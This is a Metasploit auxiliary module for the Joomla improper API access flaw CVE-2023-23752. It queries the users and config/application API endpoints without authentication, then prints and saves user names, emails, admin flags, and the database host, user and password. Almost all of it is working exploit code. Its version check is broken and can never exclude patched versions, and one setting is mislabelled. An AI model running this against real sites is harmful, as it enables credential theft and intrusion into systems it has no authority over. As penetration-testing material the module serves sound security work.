##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HTTP::Joomla

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Joomla API Improper Access Checks',
        'Description' => %q{
          Joomla versions between 4.0.0 and 4.2.7, inclusive, contain an improper API access vulnerability.
          This vulnerability allows unauthenticated users access to webservice endpoints which contain
          sensitive information.  Specifically for this module we exploit the users and config/application
          endpoints.
          This module was tested against Joomla 4.2.7 running on Docker.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Tianji Lab' # original PoC, analysis
        ],
        'References' => [
          [ 'EDB', '51334' ],
          [ 'URL', 'https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html'],
          [ 'URL', 'https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/'],
          [ 'URL', 'https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752'],
          [ 'CVE', '2023-23752']
        ],
        'Targets' => [
          [ 'Joomla 4.0.0 - 4.2.7', {}]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        },
        'DisclosureDate' => '2023-02-01',
        'DefaultTarget' => 0
      )
    )
    # set the default port, and a URI that a user can set if the app isn't installed to the root
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('TARGETURI', [ true, 'The URI of the Joomla Application', '/'])
      ]
    )
  end

  def run_host(ip)
    # check
    unless joomla_and_online?
      print_error("#{peer} - Could not connect to web service or not detected as Joomla")
      return
    end

    version = joomla_version
    if version.nil?
      print_error("#{peer} - Unable to determine Joomla Version")
      return
    end

    vprint_status("Joomla version detected: #{version}")
    if version < Rex::Version.new('4.0.0') && version >= Rex::Version.new('4.2.8')
      return
    end

    print_good("Joomla version #{version} is vulnerable")

    vprint_status('Attempting user enumeration')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'users'),
      'headers' => {
        # header is needed, it passes back JSON anyways.
        'Accept' => '*/*'
      },
      'vars_get' => {
        'public' => 'true'
      }
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Page didn't load correctly (response code: #{res.code})") unless res.code == 200

    tbl = Rex::Text::Table.new(
      'Header' => 'Joomla Users',
      'Indent' => 1,
      'Columns' => [ 'ID', 'Super User', 'Name', 'Username', 'Email', 'Send Email', 'Register Date', 'Last Visit Date', 'Group Names' ]
    )

    loot_path = store_loot('joomla_users_json', 'application/json', datastore['RHOSTS'], ip, 'joomla_users.json')
    print_good("Users JSON saved to #{loot_path}")

    users = res.get_json_document
    users = users['data']
    users.each do |user|
      unless user['type'] == 'users'
        next
      end

      tbl << [ user['attributes']['id'].to_s, user['attributes']['group_names'].include?('Super Users') ? '*' : '', user['attributes']['name'].to_s, user['attributes']['username'].to_s, user['attributes']['email'].to_s, user['attributes']['sendEmail'].to_s, user['attributes']['registerDate'].to_s, user['attributes']['lastvisitDate'].to_s, user['attributes']['group_names'].to_s ]
    end

    print_good(tbl.to_s)

    vprint_status('Attempting config enumeration')
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'api', 'index.php', 'v1', 'config', 'application'),
      'headers' => {
        # header is needed, it passes back JSON anyways.
        'Accept' => '*/*'
      },
      'vars_get' => {
        'public' => 'true'
      }
    )

    # a valid login will give us a 301 redirect to /home.html so check that.
    # ALWAYS assume res could be nil and check it first!!!!!
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Page didn't load correctly (response code: #{res.code})") unless res.code == 200

    tbl = Rex::Text::Table.new(
      'Header' => 'Joomla Config',
      'Indent' => 1,
      'Columns' => [ 'Setting', 'Value' ]
    )

    loot_path = store_loot('joomla_config_json', 'application/json', datastore['RHOSTS'], ip, 'joomla_config.json')
    print_good("Config JSON saved to #{loot_path}")

    config = res.get_json_document
    config = config['data']
    config.each do |setting|
      if setting['attributes'].key?('dbtype')
        tbl << [ 'dbtype', setting['attributes']['dbtype'].to_s ]
      elsif setting['attributes'].key?('host')
        tbl << [ 'db host', setting['attributes']['host'].to_s ]
      elsif setting['attributes'].key?('password')
        tbl << [ 'db password', setting['attributes']['password'].to_s ]
      elsif setting['attributes'].key?('user')
        tbl << [ 'db user', setting['attributes']['user'].to_s ]
      elsif setting['attributes'].key?('db')
        tbl << [ 'db name', setting['attributes']['db'].to_s ]
      elsif setting['attributes'].key?('dbprefix')
        tbl << [ 'db prefix', setting['attributes']['dbprefix'].to_s ]
      elsif setting['attributes'].key?('dbencryption')
        tbl << [ 'db prefix', setting['attributes']['dbencryption'].to_s ]
      end
    end

    print_good(tbl.to_s)
  end
end
